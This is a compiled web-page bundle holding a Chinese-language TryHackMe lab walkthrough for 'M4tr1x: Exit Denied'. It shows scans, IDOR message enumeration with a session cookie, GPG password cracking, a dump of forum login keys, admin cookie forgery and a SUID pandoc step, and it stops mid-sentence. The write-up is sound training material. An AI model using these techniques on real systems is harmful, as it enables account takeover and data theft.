"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[3905],{75418:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>l,contentTitle:()=>r,default:()=>d,frontMatter:()=>a,metadata:()=>o,toc:()=>p});var s=t(74848),i=t(28453);const a={sidebar_position:180,tags:["Easy","Linux","IDOR","SUID","\u4fe1\u606f\u6cc4\u9732"],title:"M4tr1x: Exit Denied",description:"M4tr1x: Exit Denied",sidebar_label:"M4tr1x: Exit Denied",slug:"/tryhackme/180"},r="M4tr1x: Exit Denied",o={id:"box/TryHackMe/180",title:"M4tr1x: Exit Denied",description:"M4tr1x: Exit Denied",source:"@site/docs/box/TryHackMe/180.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/180",permalink:"/docs/tryhackme/180",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"IDOR",permalink:"/docs/tags/idor"},{label:"SUID",permalink:"/docs/tags/suid"},{label:"\u4fe1\u606f\u6cc4\u9732",permalink:"/docs/tags/\u4fe1\u606f\u6cc4\u9732"}],version:"current",sidebarPosition:180,frontMatter:{sidebar_position:180,tags:["Easy","Linux","IDOR","SUID","\u4fe1\u606f\u6cc4\u9732"],title:"M4tr1x: Exit Denied",description:"M4tr1x: Exit Denied",sidebar_label:"M4tr1x: Exit Denied",slug:"/tryhackme/180"},sidebar:"boxSidebar",previous:{title:"EnterPrize",permalink:"/docs/tryhackme/179"},next:{title:"Fusion Corp",permalink:"/docs/tryhackme/181"}},l={},p=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"3306",id:"3306",level:2},{value:"80",id:"80-1",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"architect",id:"architect",level:3},{value:"architect \u2014&gt; root",id:"architect--root",level:3}];function c(n){const e={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,i.R)(),...n.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(e.h1,{id:"m4tr1x-exit-denied",children:"M4tr1x: Exit Denied"}),"\n",(0,s.jsx)(e.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-56-79:~/m4tr1xexitdenied# nmap -sTCV -p- --min-rate 1000 10.10.0.179\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-11-14 14:04 GMT\nNmap scan report for ip-10-10-0-179.eu-west-1.compute.internal (10.10.0.179)\nHost is up (0.010s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 2c:54:c1:d0:05:91:e1:c0:98:e1:41:f2:b3:21:d9:6b (RSA)\n|   256 1e:ba:57:5f:29:8c:e4:7a:b4:e5:ac:ed:65:5d:8e:32 (ECDSA)\n|_  256 7b:55:2f:23:68:08:1a:eb:90:72:43:66:e1:44:a1:9d (EdDSA)\n80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Linux-Bay\n3306/tcp open  mysql   MySQL 5.5.5-10.1.47-MariaDB-0ubuntu0.18.04.1\n| mysql-info: \n|   Protocol: 10\n|   Version: 5.5.5-10.1.47-MariaDB-0ubuntu0.18.04.1\n|   Thread ID: 109\n|   Capabilities flags: 63487\n|   Some Capabilities: ODBCClient, Support41Auth, Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsTransactions, IgnoreSigpipes, SupportsLoadDataLocal, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, InteractiveClient, SupportsCompression, FoundRows, LongPassword, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults\n|   Status: Autocommit\n|   Salt: R$\\#948\\G.N|K?:D(7}4\n|_  Auth Plugin Name: 111\nMAC Address: 02:A7:AB:43:02:B1 (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 14.10 seconds\n"})}),"\n",(0,s.jsx)(e.h2,{id:"80",children:"80"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{children:"root@ip-10-10-123-172:~/m4tr1xexitdenied# gobuster dir -u http://10.10.157.153/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.157.153/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt,html\n[+] Timeout:        10s\n===============================================================\n2023/11/18 01:25:56 Starting gobuster\n===============================================================\n/images (Status: 301)\n/rss.php (Status: 302)\n/archive (Status: 301)\n/login (Status: 200)\n/files (Status: 200)\n/index.php (Status: 200)\n/uploads (Status: 301)\n/general (Status: 200)\n/global.php (Status: 200)\n/admin (Status: 301)\n/misc.php (Status: 200)\n/contact.php (Status: 200)\n/stats.php (Status: 200)\n/search.php (Status: 200)\n/online.php (Status: 200)\n/calendar.php (Status: 200)\n/report.php (Status: 200)\n/member.php (Status: 302)\n/ftp (Status: 200)\n/portal.php (Status: 200)\n/showthread.php (Status: 200)\n/memberlist.php (Status: 200)\n/forumdisplay.php (Status: 200)\n/css.php (Status: 200)\n/install (Status: 301)\n/announcements.php (Status: 200)\n/polls.php (Status: 200)\n/cache (Status: 301)\n/blue (Status: 200)\n/private.php (Status: 200)\n/syndication.php (Status: 200)\n/flag (Status: 200)\n/inc (Status: 301)\n/newreply.php (Status: 200)\n/error (Status: 200)\n/printthread.php (Status: 200)\n/captcha.php (Status: 200)\n/attachment (Status: 200)\n/attachment.php (Status: 200)\n/usercp.php (Status: 200)\n/e-mail (Status: 200)\n/newthread.php (Status: 200)\n/secret (Status: 200)\n/panel (Status: 200)\n/administrator (Status: 200)\n/task.php (Status: 200)\n/warnings.php (Status: 200)\n/reputation.php (Status: 200)\n/htaccess.txt (Status: 200)\n/jscripts (Status: 301)\n/moderation.php (Status: 200)\n/change_password (Status: 200)\n/analyse (Status: 200)\n/server-status (Status: 403)\n/editpost.php (Status: 200)\n===============================================================\n2023/11/18 01:27:31 Finished\n===============================================================\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u8bbf\u95ee\u754c\u9762, \u53d1\u73b0\u5176\u5bf9\u5e94\u7684\u662f\u4e00\u4e2a\u8bba\u575b\u7f51\u7ad9, \u53ef\u4ee5\u5728\u5176\u4e2d\u6ce8\u518c\u7528\u6237, \u4e8e\u662f\u6211\u6ce8\u518c\u4e86\u4e00\u4e2a\u7528\u6237, \u5728\u5176\u4e2d\u53ef\u4ee5\u67e5\u770b\u4e00\u4e9b\u7528\u6237\u7684\u5e16\u5b50, \u5e76\u4e14\u6211\u53d1\u73b0\u4e00\u4e9b\u6f0f\u6d1e:"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"\u901a\u8fc7\u67e5\u770b\u4e2a\u4eba\u4e3b\u9875, \u5e76\u64cd\u4f5c id \u9009\u9879, \u53ef\u4ee5\u67e5\u770b\u5176\u4ed6\u7528\u6237\u7684\u540d\u79f0\u4fe1\u606f, \u53ef\u4ee5\u5229\u7528\u6b64\u6765\u8fdb\u884c\u66b4\u529b\u7834\u89e3"}),"\n",(0,s.jsxs)(e.li,{children:["\u9605\u8bfb\u5e16\u5b50\u6211\u6536\u96c6\u5230\u4ee5\u4e0b\u4fe1\u606f:","\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"jscale \u7528\u6237\u8981\u4e3a\u5176\u5bb6\u5ead\u8bbe\u7f6e SSH"}),"\n",(0,s.jsx)(e.li,{children:"bubbaBIGFOOT \u8bf4\u5176\u90ae\u7bb1\u5b58\u5728\u5927\u91cf\u5783\u573e\u90ae\u4ef6"}),"\n",(0,s.jsx)(e.li,{children:"\u4e00\u4e9b\u7279\u6b8a\u7684\u7528\u6237 : ArnoldBagger\u3001bigpaul\u3001BlackCat"}),"\n",(0,s.jsx)(e.li,{children:"\u53d1\u73b0\u7ba1\u7406\u5458\u7684\u4e00\u4e2a\u5e16\u5b50 \u2014 \u6f0f\u6d1e\u8d4f\u91d1\u8ba1\u5212 /bugbountyHQ , \u6b64\u7f51\u9875\u6307\u5411 /reportPanel.php , \u4ece\u8fd9\u91cc\u6211\u77e5\u9053\u4e86\u4e00\u4e9b\u5f31\u5bc6\u7801\u4ee5\u53ca\u8bba\u575b\u6f0f\u6d1e\u60c5\u51b5"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:"\u5f00\u59cb\u8fdb\u884c\u66b4\u529b\u7834\u89e3, \u83b7\u53d6\u5230\u4e00\u4e9b\u7528\u6237\u7684\u8d26\u53f7"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-205349.png",alt:"image-20240709205348271"})}),"\n",(0,s.jsx)(e.p,{children:"\u767b\u9646 ArnoldBagger \u7528\u6237\u7684\u8d26\u53f7, \u67e5\u770b\u7528\u6237\u7684\u90ae\u4ef6, \u4ece\u4e2d\u6211\u77e5\u9053\u4e86\u4e00\u4e9b\u5185\u5bb9:"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"\u6709\u4e00\u4e2a\u63d2\u4ef6\u5b58\u5728\u6f0f\u6d1e, \u5e76\u4e14\u5f00\u53d1\u51fa\u4e86\u65b0\u7248\u672c v3 \u5b58\u5728\u95ee\u9898\u7684\u7248\u672c\u662f v2 , \u540c\u65f6\u544a\u8bc9\u6211\u4eec\u9700\u8981\u8fdb\u884c\u6d4b\u8bd5 , \u8fd9\u4e2a\u5e94\u8be5\u5c31\u662f\u95ee\u9898\u7684\u5173\u952e\u70b9, \u6240\u4ee5\u6211\u4eec\u9996\u5148\u9700\u8981\u627e\u5230\u5bf9\u5e94\u7684\u63d2\u4ef6\u5b58\u653e\u4f4d\u7f6e"}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-205357.png",alt:"image-20240709205355908"})}),"\n",(0,s.jsxs)(e.p,{children:["\u4f46\u662f\u4ece\u9875\u9762\u7684\u663e\u793a\u6765\u770b, \u6211\u4eec\u5e76\u6ca1\u6709\u83b7\u53d6\u5230\u5bf9\u5e94\u7684\u63d2\u4ef6\u4fe1\u606f,  \u5728\u67e5\u770b\u90ae\u4ef6\u4fe1\u606f\u65f6, \u6211\u53d1\u73b0\u5176\u5bf9\u5e94\u7684 url \u5f88\u6709\u610f\u601d ",(0,s.jsx)(e.a,{href:"http://10.10.178.193/private.php?action=read&pmid=39",children:(0,s.jsx)(e.code,{children:"http://10.10.178.193/private.php?action=read&pmid=39"})})," \u8fd9\u5e94\u8be5\u5b58\u5728 IDOR \u6f0f\u6d1e, \u6211\u4eec\u53ef\u4ee5\u501f\u6b64\u6765\u8fdb\u884c\u679a\u4e3e, \u6765\u67e5\u770b\u4e00\u4e9b\u53ef\u80fd\u88ab\u7528\u6237\u5220\u9664\u7684\u90ae\u4ef6\u4fe1\u606f"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-145-140:~/m4tr1xexitdenied# ffuf -w ./numbers.txt:FUZZ -u 'http://10.10.178.193/private.php?action=read&pmid=FUZZ'  -b \"mybb[lastvisit]=1700283844; sid=9647324899039f13bfc44093719a9bec; _ga=GA1.1.1847425810.1700283845; _gid=GA1.1.625594847.1700283845; mybb[lastactive]=1700283858; loginattempts=1; mybbuser=11_OoTfmlJyJhdJiqHXucrvRueHvGhE6LnBi5ih27KLQBKfigQLud\" -fs 9359\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.178.193/private.php?action=read&pmid=FUZZ\n :: Wordlist         : FUZZ: ./numbers.txt\n :: Header           : Cookie: mybb[lastvisit]=1700283844; sid=9647324899039f13bfc44093719a9bec; _ga=GA1.1.1847425810.1700283845; _gid=GA1.1.625594847.1700283845; mybb[lastactive]=1700283858; loginattempts=1; mybbuser=11_OoTfmlJyJhdJiqHXucrvRueHvGhE6LnBi5ih27KLQBKfigQLud\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response size: 9359\n________________________________________________\n\n4                       [Status: 200, Size: 21487, Words: 1270, Lines: 462]\n40                      [Status: 200, Size: 21945, Words: 1302, Lines: 468]\n7                       [Status: 200, Size: 22558, Words: 1418, Lines: 474]\n5                       [Status: 200, Size: 22088, Words: 1320, Lines: 474]\n9                       [Status: 200, Size: 22090, Words: 1328, Lines: 470]\n22                      [Status: 200, Size: 20930, Words: 1213, Lines: 462]\n18                      [Status: 200, Size: 21213, Words: 1267, Lines: 460]\n19                      [Status: 200, Size: 21989, Words: 1304, Lines: 476]\n16                      [Status: 200, Size: 21259, Words: 1279, Lines: 460]\n14                      [Status: 200, Size: 21014, Words: 1228, Lines: 460]\n12                      [Status: 200, Size: 21224, Words: 1249, Lines: 464]\n34                      [Status: 200, Size: 20901, Words: 1204, Lines: 460]\n30                      [Status: 200, Size: 20914, Words: 1205, Lines: 462]\n31                      [Status: 200, Size: 21836, Words: 1275, Lines: 474]\n29                      [Status: 200, Size: 20914, Words: 1205, Lines: 462]\n28                      [Status: 200, Size: 21875, Words: 1316, Lines: 466]\n39                      [Status: 200, Size: 21792, Words: 1312, Lines: 462]\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u67e5\u770b\u53d1\u73b0\u7684\u7535\u5b50\u90ae\u4ef6\u6211\u4ece\u4e2d\u53d1\u73b0\u4e00\u4e2a\u65b0\u7684\u6587\u4ef6\u5939"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-205405.png",alt:"image-20240709205404097"})}),"\n",(0,s.jsx)(e.p,{children:"\u8bbf\u95ee\u65b0\u53d1\u73b0\u7684\u6587\u4ef6\u5939"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-205411.png",alt:"image-20240709205410459"})}),"\n",(0,s.jsx)(e.p,{children:"\u67e5\u770b\u5bf9\u5e94\u7684 v2 \u7248\u672c\u7684\u63d2\u4ef6\u5185\u5bb9, \u6211\u4eec\u53ef\u4ee5\u4ece\u4e2d\u8bfb\u53d6\u5230\u63d2\u4ef6\u7684\u76f8\u5173\u6e90\u4ee3\u7801, \u6211\u5728\u8fd9\u91cc\u9009\u62e9\u5176\u4e2d\u4e3b\u8981\u7684\u51e0\u6761\u5185\u5bb9"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-php",children:"$sql_p = file_get_contents('inc/tools/manage/SQL/p.txt'); //read SQL password from p.txt\n$db = mysql_connect('localhost','mod',$sql_p);\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u4ece\u8fd9\u91cc\u77e5\u9053\u662f\u4ece p.txt \u4e2d\u8bfb\u53d6\u5bf9\u5e94\u7684\u7528\u6237\u5bc6\u7801, \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u7834\u89e3\u6b64 gpg \u6587\u4ef6, \u4f46\u662f\u6ca1\u6709\u6548\u679c, \u67e5\u770b\u63d0\u793a\u4fe1\u606f, \u5176\u544a\u8bc9\u6211\u4eec ",(0,s.jsx)(e.code,{children:"Page Source"})," \u63a5\u7740\u67e5\u770b\u7f51\u9875\u6e90\u4ee3\u7801, \u6700\u7ec8\u5728\u6f0f\u6d1e\u5217\u8868\u4e2d\u53d1\u73b0\u4e00\u4e9b\u5185\u5bb9"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-205428.png",alt:"image-20240709205427174"})}),"\n",(0,s.jsx)(e.p,{children:"\u5bf9\u5e94\u7684\u5c06\u5176\u8fdb\u884c\u7f16\u7801\u89e3\u6790"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-php",children:"Keymaker message:\napermutationofonlytheenglishletterswillopenthelocks\n\naddress: /0100101101100101011110010110110101100001011010110110010101110010\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u8bbf\u95ee ",(0,s.jsx)(e.code,{children:"/0100101101100101011110010110110101100001011010110110010101110010"})," \u9875\u9762, \u53d1\u73b0\u5b58\u5728\u8fd9\u4e2a\u9875\u9762"]}),"\n",(0,s.jsxs)(e.p,{children:["\u4ece\u5176\u4e2d\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u5230\u4e00\u4e2a\u5173\u952e\u7684\u5b57\u7b26\u4e32, \u4ece\u5176\u63d0\u793a\u6765\u770b\u662f\u51e0\u4e2a\u5c0f\u5199\u5b57\u6bcd\u4e5f\u5c31\u662f ",(0,s.jsx)(e.code,{children:"ofqxvg"})]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-205436.png",alt:"image-20240709205434813"})}),"\n",(0,s.jsxs)(e.p,{children:["\u63a5\u7740\u67e5\u770b\u63d0\u793a\u544a\u8bc9\u6211\u4eec ",(0,s.jsx)(e.code,{children:"Itertools.Permutations()"})," \u5728\u8be2\u95ee GPT \u540e\u6211\u77e5\u9053\u4e86\u5176\u4f5c\u7528, \u56e0\u6b64\u501f\u52a9\u6b64\u751f\u6210\u4e86\u4e00\u4e9b\u5bc6\u7801, \u4e4b\u540e\u5f00\u59cb\u89e3\u5bc6\u6211\u4eec\u7684\u6587\u4ef6"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-python",children:"import itertools\n\n# \u751f\u6210\u5217\u8868 [1, 2, 3] \u7684\u6240\u6709\u6392\u5217\nperms = itertools.permutations(['f', 'v', 'g', 'o', 'x', 'q'])\n\n# \u6253\u5370\u6240\u6709\u6392\u5217\nfor perm in perms:\n    print(''.join(perm))\n"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'root@ip-10-10-145-140:~/m4tr1xexitdenied# gpg2john p.txt.gpg > hash.txt\nroot@ip-10-10-145-140:~/m4tr1xexitdenied# john hash.txt --wordlist=pass.txt \nWarning: detected hash type "gpg", but the string is also recognized as "gpg-opencl"\nUse the "--format=gpg-opencl" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])\nCost 1 (s2k-count) is 65011712 for all loaded hashes\nCost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes\nCost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes\nWill run 2 OpenMP threads\nPress \'q\' or Ctrl-C to abort, almost any other key for status\nfvgoxq           (?)\n1g 0:00:00:00 DONE (2023-11-18 05:26) 6.250g/s 12.50p/s 12.50c/s 12.50C/s fvgoxq\nUse the "--show" option to display all of the cracked passwords reliably\nSession completed.\n\nroot@ip-10-10-145-140:~/m4tr1xexitdenied# gpg --decrypt p.txt.gpg \ngpg: AES256 encrypted data\ngpg: encrypted with 1 passphrase\nmyS3CR3TPa55 //SQL Password\n'})}),"\n",(0,s.jsx)(e.h2,{id:"3306",children:"3306"}),"\n",(0,s.jsx)(e.p,{children:"\u63a5\u4e0b\u6765\u4f7f\u7528\u5f97\u5230\u7684\u8d26\u53f7\u548c\u5bc6\u7801\u5207\u6362\u767b\u9646\u6211\u4eec\u7684 mysql , \u4e4b\u540e\u6211\u4eec\u4ece\u4e2d\u53ef\u4ee5\u83b7\u53d6\u5230\u7ed3\u679c\u7528\u6237\u7684 login_key"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-145-140:~/m4tr1xexitdenied# mysql -u mod -h 10.10.178.193 -p\nmysql> SELECt * FROM members;\n+----------------+-----------------------------------------------------+\n| user           | login_key                                           |\n+----------------+-----------------------------------------------------+\n| LucyRob        | xa72nhg3opUxviKUZWbMAwmyOekaJOFTGjiJjfAMhPkeIjk2Ig  |\n| Wannabe_Hacker | LsVBnPTZGeUw6JkmMKFrzkSIUPu5TC0Nej8DAjwYXenQcCFEpv  |\n| batmanZero     | TBTZq6GfniPvFfb2A3rA2mQoThcb5U7irVF5lLpr0L4cJcy5m9  |\n| SandraJannit   | 6V5H71ZnvoW0FFbXx97YsV9LSnT4mltu9XB1v8qPo2X2CvfWBS  |\n| biggieballo    | 75mXme5o0eY2o68sqeGBlTDvZcyJKmBhxUAusxiv6b816QilCG  |\n| AimsGregger    | Xj8nuWt5Xn9UYzpIha1q2Fk4GUjyrEPPbpchDCwnniUO0ZzZyf  |\n| BlackCat       | JY1Avl8cqCMkIFprMxWbTxwf8dSkiv7GJHzlPDWJWWg9gnG3FB  |\n| Golderg        | clkNBtIoKICfzm6joGE2lTUiF2T8sVUfhtb2Aksst8zTRK2842  |\n| TonyMontana    | 8CtllQvd9V2qqHv0ZSjUj3PzuTSD37pam4ld8YjlB7gDN0zVwE  |\n| CaseBrax       | eHXBFESqEoE5Ba2gcOjD8oBMJcgNRkazcJOc8wQQ9mGVRpMdvU  |\n| Ellie          | G9KY2siJp9OOymdCiQclQn9UhxL6rSpoA3MXHCDgvHCcrCOOuT  |\n| Sosaxvector    | RURFzCfyEIBeTE3yzgQDY34zC9jWqiBwSnyzDooH33fSiYr9ci  |\n| PalacerKing    | 49wrogyJpIQI834MlhDnDnbb3Zlm0tFehnpz8ftDroesKNGbAX  |\n| Anderson       | lkJVgYjuKl9P4cg8WUb8XYlLsWKT4Zxl5sT9rgL2a2d5pgPU1w  |\n| CrazyChris     | tpM9k17itNHwqqT7b1qpX8dMq5TK83knrDrYe6KmxgiztsS1QN  |\n| StaceyLacer    | QD8HpoWWrvP1I7kC4fvTaEEunlUz2ABgFUG5Huj8nqeInlz7df  |\n| ArnoldBagger   | OoTfmlJyJhdJiqHXucrvRueHvGhE6LnBi5ih27KLQBKfigQLud  |\n| Carl_Dee       | 3mPkPyBRwo67MOrJCOW8JDorQ8FvLpuCnreGowYrMYymVvDDXr  |\n| Xavier         | ZBs4Co6qovOGI7H9FOI1qPhURDOagvBUgdXo8gphst8DhIyukP  |\n+----------------+-----------------------------------------------------+\n19 rows in set (0.00 sec)\n"})}),"\n",(0,s.jsx)(e.h2,{id:"80-1",children:"80"}),"\n",(0,s.jsx)(e.p,{children:"\u73b0\u5728\u6211\u4eec\u83b7\u53d6\u5230\u4e86\u767b\u9646\u7684 key , \u6839\u636e\u6211\u4eec\u4e4b\u524d\u7684\u7b5b\u9009\u9009\u62e9\u5176\u4e2d\u91cd\u8981\u7684\u51e0\u4e2a\u7528\u6237, \u53d1\u73b0\u53ea\u6709 BlackCat \u7528\u6237\u7b26\u5408\u6211\u4eec\u7684\u76ee\u6807, \u56e0\u4e3a\u5176\u4e3a\u7ba1\u7406\u5458\u7528\u6237, \u5982\u679c\u6b64\u65f6\u67e5\u770b\u767b\u9646\u7684 cookie \u5c31\u4f1a\u53d1\u73b0\u4e00\u4e9b\u7279\u6b8a\u4e4b\u5904, \u53ef\u4ee5\u53d1\u73b0\u767b\u9646\u7684\u5173\u952e\u4fe1\u606f\u662f uid_login_key"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-205450.png",alt:"image-20240709205449195"})}),"\n",(0,s.jsx)(e.p,{children:"\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f2a\u9020 BlackCat  \u7528\u6237\u8fdb\u884c\u767b\u9646"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-205458.png",alt:"image-20240709205457222"})}),"\n",(0,s.jsx)(e.p,{children:"\u767b\u9646\u4e4b\u540e\u67e5\u770b\u7528\u6237\u7684\u9644\u4ef6, \u4ece\u4e2d\u53d1\u73b0\u4e00\u4e9b\u4fe1\u606f:"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"\u4e24\u4e2a\u538b\u7f29\u6587\u4ef6, \u5176\u4e2d\u5b58\u5728\u4e00\u4e9b\u4fe1\u606f"}),"\n",(0,s.jsx)(e.li,{children:"\u4e00\u4e2a SSH-TOTP  pdf \u6587\u4ef6 : \u4e00\u79cd\u57fa\u4e8e\u65f6\u95f4\u7684\u5355\u6b21\u5bc6\u7801\u9a8c\u8bc1\u673a\u5236\uff0c\u7528\u4e8e\u589e\u5f3a SSH\uff08Secure Shell\uff09\u534f\u8bae\u7684\u5b89\u5168\u6027\u3002\u5b83\u7ed3\u5408\u4e86\u4e24\u4e2a\u5173\u952e\u5143\u7d20\uff1a\u65f6\u95f4\u540c\u6b65\u7684\u65f6\u949f\u548c\u57fa\u4e8e\u54c8\u5e0c\u51fd\u6570\u7684\u5355\u6b21\u5bc6\u7801\u751f\u6210\u7b97\u6cd5\u3002"}),"\n"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-205505.png",alt:"image-20240709205504427"})}),"\n",(0,s.jsx)(e.p,{children:"\u4ece\u4e0b\u8f7d\u7684\u538b\u7f29\u56fe\u7247\u4e2d, \u53ef\u4ee5\u6536\u96c6\u5230\u51e0\u4e2a key"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-205513.png",alt:"image-20240709205511824"})}),"\n",(0,s.jsx)(e.p,{children:"\u4ece\u7ecf\u8fc7\u67e5\u627e\u53d1\u73b0\u4e86\u4e00\u4e2a\u5df2\u7ecf\u5199\u597d\u7684\u811a\u672c, \u53ef\u4ee5\u5229\u7528\u6b64\u6765\u5b8c\u6210\u5bf9\u5bc6\u7801\u7684\u731c\u6d4b (\u8f93\u5165\u4e00\u4e9b\u53c2\u6570)"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.a,{href:"https://github.com/GeardoRanger/M4tr1xBrute/tree/main",children:"GitHub - GeardoRanger/M4tr1xBrute: M4tr1x: Exit Denied SSH-TOTP Brute Force Script"})}),"\n",(0,s.jsx)(e.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(e.h3,{id:"architect",children:"architect"}),"\n",(0,s.jsx)(e.p,{children:"\u8f93\u5165\u76f8\u5173\u7684\u53c2\u6570, \u6267\u884c\u7a0b\u5e8f\u5c31\u53ef\u4ee5\u5b9e\u73b0\u5bf9\u5bc6\u7801\u7684\u731c\u6d4b"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-205526.png",alt:"image-20240709205525282"})}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-205533.png",alt:"image-20240709205531951"})}),"\n",(0,s.jsx)(e.h3,{id:"architect--root",children:"architect \u2014> root"}),"\n",(0,s.jsxs)(e.p,{children:["\u53d1\u73b0\u5b58\u5728\u4e00\u4e2a SUID \u7a0b\u5e8f ",(0,s.jsx)(e.a,{href:"https://gtfobins.github.io/gtfobins/pandoc/#suid",children:"pandoc#suid"})]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"architect@matrixV99:~$ ls -al /usr/bin/pandoc \n-rwsr-sr-x 1 FUCK root 80908912 Mar  8  2021 /usr/bin/pandoc\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u5b9e\u73b0\u5bf9\u6587\u4ef6\u7684\u8986\u5199, 